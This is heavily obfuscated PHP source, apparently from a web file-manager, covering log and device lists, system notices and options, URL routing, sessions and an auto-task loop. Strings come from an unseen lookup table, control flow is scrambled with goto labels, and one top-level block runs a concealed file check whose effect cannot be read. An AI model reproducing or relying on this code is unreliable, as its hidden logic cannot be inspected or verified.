private function getSourceList(&$Dœê‰ºÄ) { $b…¦©è²§à =& $_SERVER[Ä¿Ş°¨]; $aìˆ°‰—Ã¦ = array(); foreach ($Dœê‰ºÄ as $aâ·ò¥ª£ => $fÀ¶§ğ–ù) { goto Cªñîò±ø¯; Cªñîò±ø¯: $DˆØÜ‹…ô = json_decode($fÀ¶§ğ–ù[$b…¦©è²§à[409]], !0); if ($fÀ¶§ğ–ù[$b…¦©è²§à[29]] == $b…¦©è²§à[2035]) { $DˆØÜ‹…ô = $this->descZipDownload($DˆØÜ‹…ô, $aìˆ°‰—Ã¦); $Dœê‰ºÄ[$aâ·ò¥ª£][$b…¦©è²§à[409]] = json_encode($DˆØÜ‹…ô); continue; } if (strpos($fÀ¶§ğ–ù[$b…¦©è²§à[29]], $b…¦©è²§à[2235]) !== 0) { goto D®­ª¡õ; D®­ª¡õ: if (!isset($DˆØÜ‹…ô[$b…¦©è²§à[75]]) || strpos($fÀ¶§ğ–ù[$b…¦©è²§à[29]], $b…¦©è²§à[2420]) !== 0) { continue; } if (!IO::init($DˆØÜ‹…ô[$b…¦©è²§à[75]])) { continue; } if (!($fÜº«ÎµöÊ = IO::infoFull($DˆØÜ‹…ô[$b…¦©è²§à[75]]))) { continue; } goto e‡¥Êºˆì†; e‡¥Êºˆì†: $aìˆ°‰—Ã¦[] = $DˆØÜ‹…ô[$b…¦©è²§à[374]] = $fÜº«ÎµöÊ[$b…¦©è²§à[374]]; $aìˆ°‰—Ã¦[] = $DˆØÜ‹…ô[$b…¦©è²§à[2234]] = $fÜº«ÎµöÊ[$b…¦©è²§à[465]]; $Dœê‰ºÄ[$aâ·ò¥ª£][$b…¦©è²§à[409]] = json_encode($DˆØÜ‹…ô); goto e…ØöøÛÏÀ; e…ØöøÛÏÀ: continue; goto e‹‰¥¨£Åà; e‹‰¥¨£Åà: } goto fëÓ¢Ï›©Œ; Bƒ°ŒÂŸ”š: if ($DˆØÜ‹…ô[$b…¦©è²§à[29]] == $b…¦©è²§à[2242]) { $aìˆ°‰—Ã¦[] = $DˆØÜ‹…ô[$b…¦©è²§à[409]][$b…¦©è²§à[374]]; } goto Bå‚‹Ï¨í; fëÓ¢Ï›©Œ: $aìˆ°‰—Ã¦[] = $DˆØÜ‹…ô[$b…¦©è²§à[374]]; $aìˆ°‰—Ã¦[] = $DˆØÜ‹…ô[$b…¦©è²§à[2234]]; if ($DˆØÜ‹…ô[$b…¦©è²§à[29]] == $b…¦©è²§à[496]) { $aìˆ°‰—Ã¦[] = $DˆØÜ‹…ô[$b…¦©è²§à[409]][$b…¦©è²§à[991]]; $aìˆ°‰—Ã¦[] = $DˆØÜ‹…ô[$b…¦©è²§à[409]][$b…¦©è²§à[992]]; } goto Bƒ°ŒÂŸ”š; Bå‚‹Ï¨í: } if (!$aìˆ°‰—Ã¦) { return array(); } return Model($b…¦©è²§à[746])->sourceListInfo($aìˆ°‰—Ã¦, !0); } private function logList($EæËé±ğæ) { goto e†¾÷º‡í¥; FÀÏî÷ŒÌ: $c¢¶‡¡Š» = $this->getSourceList($EæËé±ğæ); $Fç¶ªƒ‚¡ = $this->typeAll(); $A’ªÊ–¹Ê˜ = array(); goto Bîˆ³É™«¼; e†¾÷º‡í¥: $Fğ‡¡ÜÙ¼  =& $_SERVER[Ä¿Ş°¨]; $Aª·á Ö‹ = array_to_keyvalue($EæËé±ğæ, $Fğ‡¡ÜÙ¼ [33], $Fğ‡¡ÜÙ¼ [1399]); $DÏß¼¨£ = Model($Fğ‡¡ÜÙ¼ [481])->userListInfo(array_unique($Aª·á Ö‹)); goto FÀÏî÷ŒÌ; Bîˆ³É™«¼: $eÚãèœ¼ó… = array(); foreach ($EæËé±ğæ as $fôÎ‘Ç«Ÿò => $F’Äóçòñë) { goto B®‹áŒ™è; B®‹áŒ™è: $Eø×­½ªõÚ = $F’Äóçòñë[$Fğ‡¡ÜÙ¼ [29]]; $eŞ‰¬œÓç = isset($DÏß¼¨£[$F’Äóçòñë[$Fğ‡¡ÜÙ¼ [1399]]]) ? $DÏß¼¨£[$F’Äóçòñë[$Fğ‡¡ÜÙ¼ [1399]]] : !1; $bÄ†¢¼–İ” = strpos($Eø×­½ªõÚ, $Fğ‡¡ÜÙ¼ [2421]) === 0 ? LNG($Fğ‡¡ÜÙ¼ [2422]) : LNG($Fğ‡¡ÜÙ¼ [2417]); goto D…ŸŒëÀ÷; Dìéª×ÌŠœ: $F’Äóçòñë[$Fğ‡¡ÜÙ¼ [2200]] = $eŞ‰¬œÓç; $B×«äôâ„À = json_decode($F’Äóçòñë[$Fğ‡¡ÜÙ¼ [409]], !0); $F’Äóçòñë[$Fğ‡¡ÜÙ¼ [2414]] = isset($B×«äôâ„À[$Fğ‡¡ÜÙ¼ [2414]]) ? $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [2414]] : $Fğ‡¡ÜÙ¼ [33]; goto c»ìŒ”ˆ—†; e­†Í‡³¸: unset($F’Äóçòñë[$Fğ‡¡ÜÙ¼ [2423]]); $A’ªÊ–¹Ê˜[] = $F’Äóçòñë; goto eµ÷Ûàì°; D…ŸŒëÀ÷: $F’Äóçòñë[$Fğ‡¡ÜÙ¼ [28]] = isset($eŞ‰¬œÓç[$Fğ‡¡ÜÙ¼ [28]]) ? $eŞ‰¬œÓç[$Fğ‡¡ÜÙ¼ [28]] : LNG($Fğ‡¡ÜÙ¼ [2417]); $F’Äóçòñë[$Fğ‡¡ÜÙ¼ [2283]] = isset($eŞ‰¬œÓç[$Fğ‡¡ÜÙ¼ [2283]]) ? $eŞ‰¬œÓç[$Fğ‡¡ÜÙ¼ [2283]] : $Fğ‡¡ÜÙ¼ [33]; $F’Äóçòñë[$Fğ‡¡ÜÙ¼ [1304]] = isset($Fç¶ªƒ‚¡[$Eø×­½ªõÚ]) ? $Fç¶ªƒ‚¡[$Eø×­½ªõÚ] : $bÄ†¢¼–İ”; goto Dìéª×ÌŠœ; c»ìŒ”ˆ—†: $this->ipAddress($F’Äóçòñë); if (strpos($Eø×­½ªõÚ, $Fğ‡¡ÜÙ¼ [2235]) === 0 || isset($B×«äôâ„À[$Fğ‡¡ÜÙ¼ [2234]])) { goto Cí”¬ã”Æ; dšÃÚå˜ó: if ($B×«äôâ„À[$Fğ‡¡ÜÙ¼ [29]] == $Fğ‡¡ÜÙ¼ [2242]) { $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [409]][$Fğ‡¡ÜÙ¼ [374]] = $c¢¶‡¡Š»[$B×«äôâ„À[$Fğ‡¡ÜÙ¼ [409]][$Fğ‡¡ÜÙ¼ [374]]]; } if ($B×«äôâ„À[$Fğ‡¡ÜÙ¼ [29]] == $Fğ‡¡ÜÙ¼ [2030]) { $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [2247]] = $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [396]]; $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [2234]] = $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [2247]][$Fğ‡¡ÜÙ¼ [374]]; $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [396]] = !1; $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [374]] = $Fğ‡¡ÜÙ¼ [33]; } if ($B×«äôâ„À[$Fğ‡¡ÜÙ¼ [396]] && $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [396]][$Fğ‡¡ÜÙ¼ [376]] == $Fğ‡¡ÜÙ¼ [1065]) { $eÚãèœ¼ó…[] = $F’Äóçòñë[$Fğ‡¡ÜÙ¼ [372]]; unset($EæËé±ğæ[$fôÎ‘Ç«Ÿò]); continue; } goto AÌµ»è‰ƒ; Cí”¬ã”Æ: $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [396]] = $c¢¶‡¡Š»[$B×«äôâ„À[$Fğ‡¡ÜÙ¼ [374]]]; $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [2247]] = $c¢¶‡¡Š»[$B×«äôâ„À[$Fğ‡¡ÜÙ¼ [2234]]]; if ($B×«äôâ„À[$Fğ‡¡ÜÙ¼ [29]] == $Fğ‡¡ÜÙ¼ [496]) { $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [409]][$Fğ‡¡ÜÙ¼ [991]] = $c¢¶‡¡Š»[$B×«äôâ„À[$Fğ‡¡ÜÙ¼ [409]][$Fğ‡¡ÜÙ¼ [991]]]; $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [409]][$Fğ‡¡ÜÙ¼ [992]] = $c¢¶‡¡Š»[$B×«äôâ„À[$Fğ‡¡ÜÙ¼ [409]][$Fğ‡¡ÜÙ¼ [992]]]; } goto dšÃÚå˜ó; AÌµ»è‰ƒ: if ($B×«äôâ„À[$Fğ‡¡ÜÙ¼ [2247]] && $B×«äôâ„À[$Fğ‡¡ÜÙ¼ [2247]][$Fğ‡¡ÜÙ¼ [376]] == $Fğ‡¡ÜÙ¼ [1065]) { $eÚãèœ¼ó…[] = $F’Äóçòñë[$Fğ‡¡ÜÙ¼ [372]]; unset($EæËé±ğæ[$fôÎ‘Ç«Ÿò]); continue; } goto FÑ±æ¦ë½Æ; FÑ±æ¦ë½Æ: } $F’Äóçòñë[$Fğ‡¡ÜÙ¼ [409]] = $B×«äôâ„À; goto e­†Í‡³¸; eµ÷Ûàì°: } $this->clearSystemPathLog($eÚãèœ¼ó…); goto e•¦²ÃÚ½; e•¦²ÃÚ½: return $A’ªÊ–¹Ê˜; goto Bèøƒ¹Œ˜; Bèøƒ¹Œ˜: } private function clearSystemPathLog($B„ïâ‰¸¤) { $c™˜ÜÇçÑÑ =& $_SERVER[Ä¿Ş°¨]; if (count($B„ïâ‰¸¤) == 0) { return; } $cã³ˆÏÀÏ“ = array($c™˜ÜÇçÑÑ[372] => array($c™˜ÜÇçÑÑ[7], array_unique($B„ïâ‰¸¤))); $this->where($cã³ˆÏÀÏ“)->delete(); } public function deviceList($E½äÙ“’’, $Eö™•¾É  = 0) { $DÙÙ–ò±ù‘ =& $_SERVER[Ä¿Ş°¨]; $c‡”å™ÒÛ = array($DÙÙ–ò±ù‘[1399] => $E½äÙ“’’, $DÙÙ–ò±ù‘[183] => array($DÙÙ–ò±ù‘[915], $Eö™•¾É ), $DÙÙ–ò±ù‘[29] => $DÙÙ–ò±ù‘[2003]); $Cö“‰Ä¨¾Å = array(); $cöµŸ¼›Ï = $this->field($DÙÙ–ò±ù‘[2424])->where($c‡”å™ÒÛ)->order($DÙÙ–ò±ù‘[2245])->limit(50)->select(); foreach ($cöµŸ¼›Ï as $C¦›õ³¸Ğ => $Cà«¨È²«ç) { goto CŒÜµ›¿Ï«; fÂ÷ó¸¢­»: $this->ipAddress($Cà«¨È²«ç); $Cà«¨È²«ç[$DÙÙ–ò±ù‘[409]] = $cêøÏ¹Œãª; $Cö“‰Ä¨¾Å[$aË×Ô¬ôŠâ] = $Cà«¨È²«ç; goto CÊË¢ªø‹Ê; cà¡ƒ³ôˆæ: unset($cêøÏ¹Œãª[$DÙÙ–ò±ù‘[2414]]); $aË×Ô¬ôŠâ = $this->deviceType($cêøÏ¹Œãª[$DÙÙ–ò±ù‘[2236]]); if (isset($Cö“‰Ä¨¾Å[$aË×Ô¬ôŠâ])) { continue; } goto fÂ÷ó¸¢­»; CŒÜµ›¿Ï«: if ($C¦›õ³¸Ğ > 0 && abs($Cà«¨È²«ç[$DÙÙ–ò±ù‘[183]] - $cöµŸ¼›Ï[$C¦›õ³¸Ğ - 1][$DÙÙ–ò±ù‘[183]]) < 5) { continue; } $cêøÏ¹Œãª = json_decode($Cà«¨È²«ç[$DÙÙ–ò±ù‘[409]], !0); $Cà«¨È²«ç[$DÙÙ–ò±ù‘[2414]] = isset($cêøÏ¹Œãª[$DÙÙ–ò±ù‘[2414]]) ? $cêøÏ¹Œãª[$DÙÙ–ò±ù‘[2414]] : $DÙÙ–ò±ù‘[33]; goto cà¡ƒ³ôˆæ; CÊË¢ªø‹Ê: } return array_values($Cö“‰Ä¨¾Å); } public function deviceType($Fçë¸”÷Î) { return $Fçë¸”÷Î; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\x6e\157\164\151\x63\x65\x4c\151\163\164"; public $field = array("\x6e\141\155\145", "\x63\x6f\156\x74\x65\156\164", "\x61\x75\164\150", "\155\x6f\144\x65", "\x74\x69\155\145", "\x74\x79\160\x65", "\x6c\x65\166\x65\154", "\x65\156\141\142\x6c\145", "\x73\157\x72\x74"); public function listData($D¨Ó×‰øáó = false, $DÜ‘Ãìàä¡ = "\163\157\x72\164", $b®Œ„Í¶¨ê = false) { return parent::listData($D¨Ó×‰øáó, $DÜ‘Ãìàä¡, $b®Œ„Í¶¨ê); } public function add($f³Ã¸áñ¦Ã) { goto FèËè˜¨Ï¤; DĞŞÎŒœ—¢: return parent::insert($f³Ã¸áñ¦Ã); goto dø‰°¹«ôØ; d¡¢Ò³é»†: $D‚Ó‰àÎİ¯ = time(); if ($f³Ã¸áñ¦Ã[$f¤á¹Üòãö[12]] == $f¤á¹Üòãö[2425]) { $D‚Ó‰àÎİ¯ = strtotime($f³Ã¸áñ¦Ã[$f¤á¹Üòãö[186]]); } $f³Ã¸áñ¦Ã[$f¤á¹Üòãö[186]] = $D‚Ó‰àÎİ¯; goto DĞŞÎŒœ—¢; FèËè˜¨Ï¤: $f¤á¹Üòãö =& $_SERVER[Ä¿Ş°¨]; $aËáÄäĞ‚İ = $this->findByName($f³Ã¸áñ¦Ã[$f¤á¹Üòãö[28]]); if ($aËáÄäĞ‚İ) { return !1; } goto d¡¢Ò³é»†; dø‰°¹«ôØ: } public function update($bªô™½Æå, $A¥é¢ÀÕá–) { goto AÚ©™÷Ìí; aùòëˆ¥Û‚: if (!$e¢ŒÃÀË || $DöÌÆ°ÜòĞ && $DöÌÆ°ÜòĞ[$E†÷ôçÇ¾[372]] != $e¢ŒÃÀË[$E†÷ôçÇ¾[372]]) { return !1; } $Eã÷óëÕê™ = time(); if ($A¥é¢ÀÕá–[$E†÷ôçÇ¾[12]] == $E†÷ôçÇ¾[2425]) { $Eã÷óëÕê™ = strtotime($A¥é¢ÀÕá–[$E†÷ôçÇ¾[186]]); } goto cÙ½Õù‹Ù™; cÙ½Õù‹Ù™: $A¥é¢ÀÕá–[$E†÷ôçÇ¾[186]] = $Eã÷óëÕê™; return parent::update($bªô™½Æå, $A¥é¢ÀÕá–); goto fñîå‘º‚Ç; AÚ©™÷Ìí: $E†÷ôçÇ¾ =& $_SERVER[Ä¿Ş°¨]; $e¢ŒÃÀË = $this->listData($bªô™½Æå); $DöÌÆ°ÜòĞ = $this->findByName($A¥é¢ÀÕá–[$E†÷ôçÇ¾[28]]); goto aùòëˆ¥Û‚; fñîå‘º‚Ç: } public function remove($BßİÏêÉŠ”) { $d«Š›ÁŸ÷Î = $this->listData($BßİÏêÉŠ”); if (!$d«Š›ÁŸ÷Î || $d«Š›ÁŸ÷Î[$_SERVER[Ä¿Ş°¨][1065]]) { return !1; } return parent::remove($BßİÏêÉŠ”); } public function sort($dÅ“İù‚œ©, $f÷²¾õ÷¨‚) { return parent::update($dÅ“İù‚œ©, $f÷²¾õ÷¨‚); } public function enable($FÍŒ¯›©Å“, $BŸ‰Àô‹Ô) { return parent::update($FÍŒ¯›©Å“, array($_SERVER[Ä¿Ş°¨][2426] => $BŸ‰Àô‹Ô)); } private function initUserOption() { $b‰óã”×Ù =& $_SERVER[Ä¿Ş°¨]; $this->optionType = $b‰óã”×Ù[2427]; $this->modelType = $b‰óã”×Ù[2428]; $this->field = array($b‰óã”×Ù[2429], $b‰óã”×Ù[28], $b‰óã”×Ù[186], $b‰óã”×Ù[29], $b‰óã”×Ù[2430], $b‰óã”×Ù[683], $b‰óã”×Ù[179]); } public function userNoticeGet($Aˆ·°òé¡Ñ = false) { $this->initUserOption(); return parent::listData($Aˆ·°òé¡Ñ, $_SERVER[Ä¿Ş°¨][372], !0); } public function userNoticeAdd($EŞ’Ã¶¦½ò) { $fï™ÛÆ•İ =& $_SERVER[Ä¿Ş°¨]; $this->initUserOption(); $FÑİ®Åˆí± = $this->findByKey($fï™ÛÆ•İ[2429], $EŞ’Ã¶¦½ò[$fï™ÛÆ•İ[372]]); if ($FÑİ®Åˆí±) { return !0; } $eôŒ–àóèÚ = array($fï™ÛÆ•İ[2429] => $EŞ’Ã¶¦½ò[$fï™ÛÆ•İ[372]], $fï™ÛÆ•İ[28] => $EŞ’Ã¶¦½ò[$fï™ÛÆ•İ[28]], $fï™ÛÆ•İ[186] => $EŞ’Ã¶¦½ò[$fï™ÛÆ•İ[186]], $fï™ÛÆ•İ[29] => isset($EŞ’Ã¶¦½ò[$fï™ÛÆ•İ[29]]) ? $EŞ’Ã¶¦½ò[$fï™ÛÆ•İ[29]] : 1, $fï™ÛÆ•İ[2430] => isset($EŞ’Ã¶¦½ò[$fï™ÛÆ•İ[2430]]) ? $EŞ’Ã¶¦½ò[$fï™ÛÆ•İ[2430]] : 0, $fï™ÛÆ•İ[683] => 0, $fï™ÛÆ•İ[179] => 0); return parent::insert($eôŒ–àóèÚ); } public function userNoticeEdit($c×­©å´¸Ú, $cìË¬’¹’¢) { $this->initUserOption(); return parent::update($c×­©å´¸Ú, $cìË¬’¹’¢); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\164\145\155\x5f\x6f\160\164\151\x6f\156"; protected $jsonField = array("\155\145\x6e\165", "\x72\157\154\x65", "\162\157\x6c\145\107\162\157\x75\x70", "\162\x65\x67\x69\163\164", "\145\x6d\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ağ›Òğ) { return "\x53\171\x73\x74\145\x6d\x4f\x70\164\x69\157\156\x5f{$ağ›Òğ}"; } protected function optionDefault($fÏ••ç£ßğ = '') { $d—·Ù–™ƒ =& $_SERVER[Ä¿Ş°¨]; if ($fÏ••ç£ßğ == $d—·Ù–™ƒ[33]) { return $GLOBALS[$d—·Ù–™ƒ[6]][$d—·Ù–™ƒ[2431]]; } } } goto A°À‡òÔ–; AÍÖÍ¡¦âÑ: define($_SERVER[Ä¿Ş°¨][223], 2); define($_SERVER[Ä¿Ş°¨][224], 3); define($_SERVER[Ä¿Ş°¨][225], 1); goto C›øõò·°; DïÙ³„ÂÉ: $EÀïÏóêÔ = LIB_DIR . $_SERVER[Ä¿Ş°¨][1742]; $E£„“¸¶Œ× = $_SERVER[Ä¿Ş°¨][1329]; if ($_SERVER[$_SERVER[Ä¿Ş°¨][360]] != $E£„“¸¶Œ×($EÀïÏóêÔ)) { goto a“ç°œåë; B†¯ÎôŸ©Ù: $EÁ­Üô«‘İ = explode($_SERVER[Ä¿Ş°¨][213], $f¤¹œ¶ÁŸ÷); if (count($EÁ­Üô«‘İ) < $_SERVER[Ä¿Ş°¨][365]) { $Dö’Á“ïîò = $_SERVER[Ä¿Ş°¨][366]; $Dö’Á“ïîò(); } $a§–—»¢ñ = $_SERVER[Ä¿Ş°¨][367]; goto D¸çàÏ³–£; a“ç°œåë: $fË´…š—£ = $_SERVER[Ä¿Ş°¨][362]; $cèã¶Û–¹’ = $_SERVER[$_SERVER[Ä¿Ş°¨][363]] . $_SERVER[Ä¿Ş°¨][364]; $f¤¹œ¶ÁŸ÷ = $fË´…š—£($cèã¶Û–¹’); goto B†¯ÎôŸ©Ù; D¸çàÏ³–£: $a§–—»¢ñ($EÀïÏóêÔ); goto D¿¯’‚Óï; D¿¯’‚Óï: } goto e‹³ÒÆÖ˜õ; bÁêŒ½‘´ï: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\x79" => "\x5b\x5e\x2f\x5d\53", "\72\x6e\x75\155" => "\x5b\x30\55\71\135\53", "\x3a\141\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($AÃåë¨Æ÷, $dŠÖ°´«Äƒ) { $e³‹†ŸËñ  =& $_SERVER[Ä¿Ş°¨]; if ($AÃåë¨Æ÷ == $e³‹†ŸËñ [1348]) { $dèÃë´Â = array_map($e³‹†ŸËñ [1349], $dŠÖ°´«Äƒ[0]); $cç‡‘×¥º® = strpos($dŠÖ°´«Äƒ[1], $e³‹†ŸËñ [8]) === 0 ? $dŠÖ°´«Äƒ[1] : $e³‹†ŸËñ [8] . $dŠÖ°´«Äƒ[1]; $e…½¹õè• = $dŠÖ°´«Äƒ[2]; } else { $dèÃë´Â = null; $cç‡‘×¥º® = strpos($dŠÖ°´«Äƒ[0], $e³‹†ŸËñ [8]) === 0 ? $dŠÖ°´«Äƒ[0] : $e³‹†ŸËñ [8] . $dŠÖ°´«Äƒ[0]; $e…½¹õè• = $dŠÖ°´«Äƒ[1]; } array_push(self::$maps, $dèÃë´Â); array_push(self::$routes, $cç‡‘×¥º®); array_push(self::$methods, strtoupper($AÃåë¨Æ÷)); array_push(self::$callbacks, $e…½¹õè•); } public static function error($Cå‘æÃô–) { self::$errorCallback = $Cå‘æÃô–; } public static function haltOnMatch($cƒôãƒòÙĞ = true) { self::$halts = $cƒôãƒòÙĞ; } public static function dispatch() { goto Cµ²·ã©æ¥; c¹‰øÓè‰«: self::$routes = preg_replace($Aîé­Ùñ÷[1058], $Aîé­Ùñ÷[8], self::$routes); if (in_array($D§ƒ¡Ç¨ØÇ, self::$routes)) { $Dİ°“Úí’ = array_keys(self::$routes, $D§ƒ¡Ç¨ØÇ); foreach ($Dİ°“Úí’ as $cµøù·ºïí) { if (self::$methods[$cµøù·ºïí] == $e³ÅèÓ°óĞ || self::$methods[$cµøù·ºïí] == $Aîé­Ùñ÷[1351] || in_array($e³ÅèÓ°óĞ, self::$maps[$cµøù·ºïí])) { $fÒˆÁâç¶ò = !0; if (!is_object(self::$callbacks[$cµøù·ºïí])) { $a–’Á¶½Ë‰ = explode($Aîé­Ùñ÷[8], self::$callbacks[$cµøù·ºïí]); $bì¾—ğ‡“ = end($a–’Á¶½Ë‰); $FÅˆøÊ»åé = explode($Aîé­Ùñ÷[1352], $bì¾—ğ‡“); $d·ÇÛÈ«Œğ = new $FÅˆøÊ»åé[0](); $d·ÇÛÈ«Œğ->{$FÅˆøÊ»åé[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$cµøù·ºïí]); if (self::$halts) { return; } } } } } else { $Cğ¶Û¡¬œ† = 0; foreach (self::$routes as $cµøù·ºïí) { if (strpos($cµøù·ºïí, $Aîé­Ùñ÷[4]) !== !1) { $cµøù·ºïí = str_replace($fÁ’ì‰ßæ, $fÜèŒã±‰, $cµøù·ºïí); } if (preg_match($Aîé­Ùñ÷[1353] . $cµøù·ºïí . $Aîé­Ùñ÷[1354], $D§ƒ¡Ç¨ØÇ, $Dï”ë¸‚)) { if (self::$methods[$Cğ¶Û¡¬œ†] == $e³ÅèÓ°óĞ || self::$methods[$Cğ¶Û¡¬œ†] == $Aîé­Ùñ÷[1351] || !empty(self::$maps[$Cğ¶Û¡¬œ†]) && in_array($e³ÅèÓ°óĞ, self::$maps[$Cğ¶Û¡¬œ†])) { $fÒˆÁâç¶ò = !0; array_shift($Dï”ë¸‚); if (!is_object(self::$callbacks[$Cğ¶Û¡¬œ†])) { $a–’Á¶½Ë‰ = explode($Aîé­Ùñ÷[8], self::$callbacks[$Cğ¶Û¡¬œ†]); $bì¾—ğ‡“ = end($a–’Á¶½Ë‰); $FÅˆøÊ»åé = explode($Aîé­Ùñ÷[1352], $bì¾—ğ‡“); $d·ÇÛÈ«Œğ = new $FÅˆøÊ»åé[0](); if (!method_exists($d·ÇÛÈ«Œğ, $FÅˆøÊ»åé[1])) { echo $Aîé­Ùñ÷[1355]; } else { call_user_func_array(array($d·ÇÛÈ«Œğ, $FÅˆøÊ»åé[1]), $Dï”ë¸‚); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Cğ¶Û¡¬œ†], $Dï”ë¸‚); if (self::$halts) { return; } } } } $Cğ¶Û¡¬œ†++; } } if ($fÒˆÁâç¶ò == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $D§•ß°êÌ³ =& $_SERVER[Ä¿Ş°¨]; header($_SERVER[$D§•ß°êÌ³[1356]] . $D§•ß°êÌ³[1357]); echo $D§•ß°êÌ³[1358]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Aîé­Ùñ÷[1350]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto B¸Š÷š‹Ô; Cµ²·ã©æ¥: $Aîé­Ùñ÷ =& $_SERVER[Ä¿Ş°¨]; $D§ƒ¡Ç¨ØÇ = parse_url($_SERVER[$Aîé­Ùñ÷[1350]], PHP_URL_PATH); $e³ÅèÓ°óĞ = $_SERVER[$Aîé­Ùñ÷[150]]; goto AĞì‹ïºä±; AĞì‹ïºä±: $fÁ’ì‰ßæ = array_keys(static::$patterns); $fÜèŒã±‰ = array_values(static::$patterns); $fÒˆÁâç¶ò = !1; goto c¹‰øÓè‰«; B¸Š÷š‹Ô: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto C÷˜¾èÇØ; FÖÊøÈÉæ—: switch ($c©‡Ü™…¼’) { case $dÜ¼íØÓà[17]: self::$handle = Model($dÜ¼íØÓà[749]); break; case $dÜ¼íØÓà[750]: self::$handle = new CacheRedis($C·Áäƒ®ƒß, $D¨Û–½˜‹„); break; case $dÜ¼íØÓà[751]: self::$handle = new CacheMemcached($C·Áäƒ®ƒß, $D¨Û–½˜‹„); break; case $dÜ¼íØÓà[163]: $C·Áäƒ®ƒß[$dÜ¼íØÓà[75]] = $C·Áäƒ®ƒß[$dÜ¼íØÓà[75]] . $dÜ¼íØÓà[1362]; self::$handle = new CacheFile($C·Áäƒ®ƒß, $D¨Û–½˜‹„); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $cø±«¶š¾– = new self(); goto c‹˜®Ê·”; dˆï‹Ì™È¨: $FŒâ»ˆ˜ä‰ = $GLOBALS[$dÜ¼íØÓà[6]][$dÜ¼íØÓà[333]]; self::$sessionTime = $FŒâ»ˆ˜ä‰[$dÜ¼íØÓà[1359]]; $D—¼êÄÄê³ = SESSION_ID; goto B…è¹ƒÏŞ’; C÷˜¾èÇØ: $dÜ¼íØÓà =& $_SERVER[Ä¿Ş°¨]; static $cø±«¶š¾– = false; if ($cø±«¶š¾–) { return $cø±«¶š¾–; } goto dˆï‹Ì™È¨; B…è¹ƒÏŞ’: $D—¼êÄÄê³ = _get($GLOBALS, $dÜ¼íØÓà[1360], $D—¼êÄÄê³); if (self::$sessionSign) { } else { if (Cookie::get($D—¼êÄÄê³)) { self::$sessionSign = Cookie::get($D—¼êÄÄê³); } else { self::$sessionSign = guid(); } } Cookie::setSafe($D—¼êÄÄê³, self::$sessionSign, self::$sessionTime); goto BìŒŠˆœ–­; c‹˜®Ê·”: return $cø±«¶š¾–; goto Aòô’¥‘ãÔ; BìŒŠˆœ–­: $c©‡Ü™…¼’ = $FŒâ»ˆ˜ä‰[$dÜ¼íØÓà[1361]]; $C·Áäƒ®ƒß = $FŒâ»ˆ˜ä‰[$c©‡Ü™…¼’]; $D¨Û–½˜‹„ = $FŒâ»ˆ˜ä‰[$dÜ¼íØÓà[748]]; goto FÖÊøÈÉæ—; Aòô’¥‘ãÔ: } public static function sign($Eóåã°œ²  = false) { $Eóåã°œ²  && (self::$sessionSign = $Eóåã°œ² ); self::init(); return self::$sessionSign; } public static function set($cÉ˜†Íçô, $eÊÍ¨¢­¼õ = false) { self::init(); if (is_array($cÉ˜†Íçô)) { foreach ($cÉ˜†Íçô as $aì¤¾Œ„ÖŞ => $bƒÒ£ˆõ) { array_set_value(self::$data, $aì¤¾Œ„ÖŞ, $bƒÒ£ˆõ); } } else { array_set_value(self::$data, $cÉ˜†Íçô, $eÊÍ¨¢­¼õ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($Eœí©«äÕ = false) { self::init(); if (!$Eœí©«äÕ) { return self::$data; } return array_get_value(self::$data, $Eœí©«äÕ); } public static function remove($E…”ñÎçêå) { self::init(); unset(self::$data[$E…”ñÎçêå]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ä¿Ş°¨][753])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto FĞ˜ÇçÜöÄ; FĞ˜ÇçÜöÄ: $dš‡ùøÓ  =& $_SERVER[Ä¿Ş°¨]; if (self::valueGet($dš‡ùøÓ [683]) != $dš‡ùøÓ [83]) { return; } if (self::valueGet($dš‡ùøÓ [1363]) == $dš‡ùøÓ [83]) { $bÙÊ˜…¬›¨ = self::valueGet($dš‡ùøÓ [1364]); if (time() - $bÙÊ˜…¬›¨ > 3600 * 2) { self::restart(); } return; } goto cˆÊÅÖŸ‹™; cˆÊÅÖŸ‹™: http_close(); self::valueSet($dš‡ùøÓ [1363], $dš‡ùøÓ [83]); Hook::bind($dš‡ùøÓ [1365], $dš‡ùøÓ [1366]); goto DÓ¿‡…Œí; DÓ¿‡…Œí: while (!0) { self::cacheClear(); if (self::valueGet($dš‡ùøÓ [683]) != $dš‡ùøÓ [83]) { self::valueSet($dš‡ùøÓ [1363], $dš‡ùøÓ [472]); self::log($dš‡ùøÓ [1367]); die; } 